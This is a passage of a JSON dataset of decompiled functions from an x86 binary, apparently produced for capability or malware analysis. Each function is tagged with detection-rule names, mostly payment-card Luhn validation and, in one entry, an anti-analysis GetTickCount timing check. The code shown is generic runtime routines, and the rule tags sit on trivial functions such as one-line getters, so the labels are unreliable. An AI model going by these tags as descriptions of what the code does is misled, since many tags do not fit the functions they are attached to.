*(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 781
    },
    "00403cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cc4(void)\n\n{\n    uint uVar1;\n    char cStack264;\n    \n    fcn.00405530();\n    fcn.00403cb8();\n    uVar1 = fcn.00405794();\n    while (cStack264 == -1) {\n        fcn.00403cb8();\n        fcn.00405794();\n        fcn.00405818();\n        fcn.00405530();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00403fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403fdc(int32_t param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_1, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar3 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n            iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n            if (param_1 < iVar2) break;\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n            param_1 = param_1 - iVar2;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *param_2;\n                param_2 = param_2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (**(in_EAX + 0x1c))();\n            if (iVar2 != 0) {\n                fcn.0040307c();\n                return in_EAX;\n            }\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_1;\n        for (; param_1 != 0; param_1 = param_1 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 399
    },
    "00404618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404618(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404620(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004046d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046d4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004046eb. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004046ed. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00404798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404798(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "0040481c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040481c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404890(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004048d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048d4(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "004049cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004049cc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4049fb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404eec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404f37;\n    piVar3 = fcn.00407688();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00404650();\n        fcn.00404a2c();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 213
    },
    "00404f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f88(int32_t *arg_8h)\n\n{\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 34
    },
    "0040521c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040521c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00407550();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 73
    },
    "00405244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405244(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "00405554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405554(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402f1c();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "004055f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.004055f4(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402f00();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 118
    },
    "0040568c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040568c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405650(param_1),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(param_1);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00405728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405728(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004057a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057a0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 176
    },
    "004057b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057b8(uint32_t param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t arg_8h;\n    int16_t *piVar3;\n    bool bVar4;\n    \n    bVar4 = true;\n    uVar2 = param_1;\n    piVar3 = param_2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        bVar4 = *piVar3 == 0;\n        piVar3 = piVar3 + 1;\n    } while (!bVar4);\n    if (bVar4) {\n        uVar2 = ~uVar2;\n    }\n    arg_8h = uVar2 + param_1;\n    if (arg_8h < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "00405818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405818(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        if (!SCARRY4(*(param_2 + -4), *(iVar2 + -4))) {\n            if (param_2 == iVar2) {\n                fcn.00405c6c();\n            }\n            else {\n                fcn.00405c6c();\n            }\n            fcn.004030fc();\n            return;\n        }\n        if (*0x496008 != NULL) {\n            (**0x496008)(param_2);\n        }\n        fcn.00402ff8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.004055f4(param_2);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "00405864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405864(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t **in_EAX;\n    int32_t iVar4;\n    \n    ppiVar3 = param_1;\n    if ((param_2 != NULL) && (ppiVar3 = param_2,  param_1 != NULL)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                in_EAX = param_2;\n                if (!SCARRY4(param_2[-1], param_1[-1])) {\n                    iVar4 = fcn.004055f4();\n                    fcn.004030fc();\n                    fcn.004030fc();\n                    if (iVar4 != 0) {\n                        *(iVar4 + -8) = *(iVar4 + -8) + -1;\n                    }\n                    fcn.00405584();\n                    return;\n                }\n                goto code_r0x00403004;\n            }\n            fcn.00405584();\n        }\n        if (param_1 == NULL) {\n            return;\n        }\n        ppiVar2 = *in_EAX;\n        ppiVar3 = param_1;\n        if (ppiVar2 != NULL) {\n            if (!SCARRY4(param_1[-1], ppiVar2[-1])) {\n                if (param_1 == ppiVar2) {\n                    fcn.00405c6c();\n                }\n                else {\n                    fcn.00405c6c();\n                }\n                fcn.004030fc();\n                return;\n            }\ncode_r0x00403004:\n            if (*0x496008 != NULL) {\n                (**0x496008)(param_1, in_EAX);\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    if (ppiVar3 != NULL) {\n        piVar1 = ppiVar3[-2];\n        if (piVar1 == 0xffffffff || SCARRY4(piVar1, 1) != piVar1 + 1 < 0) {\n            ppiVar3 = fcn.004055f4(ppiVar3);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            ppiVar3[-2] = ppiVar3[-2] + 1;\n        }\n    }\n    piVar1 = *in_EAX;\n    *in_EAX = ppiVar3;\n    if ((piVar1 != NULL) && (0 < piVar1[-2])) {\n        LOCK();\n        piVar1 = piVar1 + -2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "004058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004058e0(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar4 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    if ((piVar1 == NULL) || (*in_EAX != piVar1)) {\n        iVar2 = 0;\n        iVar3 = param_2;\n    }\n    else {\n        iVar2 = piVar1[-1];\n        iVar3 = param_2 + -1;\n        piVar4 = piVar1;\n    }\n    do {\n        piVar1 = *(&stack0x00000000 + iVar3 * 4);\n        if (piVar1 != NULL) {\n            bVar5 = SCARRY4(iVar2, piVar1[-1]);\n            iVar2 = iVar2 + piVar1[-1];\n            if (bVar5) {\n                if (*0x496008 != NULL) {\n                    (**0x496008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            if (piVar4 == piVar1) {\n                piVar4 = NULL;\n            }\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (piVar4 == NULL) {\n        iStack24 = fcn.004055f4();\n    }\n    else {\n        fcn.00405c6c();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar4 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004030fc();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar4 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.00405584();\n    }\n    // WARNING: Could not recover jumptable at 0x00405969. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 589
    },
    "00405a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a44(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00405a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a84(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00405a34();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004030fc();\n            fcn.00405c6c();\n        }\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00405acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405acc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405c6c();\n        fcn.004030fc();\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00405b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405b28(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405c00:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x00405c4f;\ncode_r0x00405c04:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x00405c4f;\n                        if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x00405c4f;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405c00;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x00405c22:\n                    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405c00;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x00405bbc:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x00405bac;\n                        if (cVar1 == pcVar2[1]) goto code_r0x00405bbc;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bac;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bbc;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x00405bac:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x00405c4f:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405c04;\n}\n",
        "token_count": 1102
    },
    "00405d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d40(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "00405d8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d8c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405670(param_1),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(param_1);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00405e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
